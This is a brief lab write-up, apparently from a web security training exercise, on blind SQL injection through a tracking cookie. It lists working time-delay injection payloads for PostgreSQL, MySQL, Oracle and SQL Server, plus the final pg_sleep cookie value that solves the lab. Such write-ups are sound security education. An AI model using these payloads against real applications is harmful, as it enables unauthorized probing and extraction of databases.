# lab-13 SQL Injection

## Blind SQL injection with time delays

### Problem 

- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

- To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

### Solution

- For PostgreSQL:`' || (SELECT pg_sleep(10))--`

- For my Sql:`' || (SELECT sleep(10))--`

- For Oracle:`' || dbms_pipe.receive_message(('a'),10)--`

- For Microsoft:`' || WAITFOR DELAY '0:0:10'`

- So it's a Postgre SQl and we use `OJyeucaRzKH8maBg' || (SELECT pg_sleep(10))--`

- Lab Solved!!!


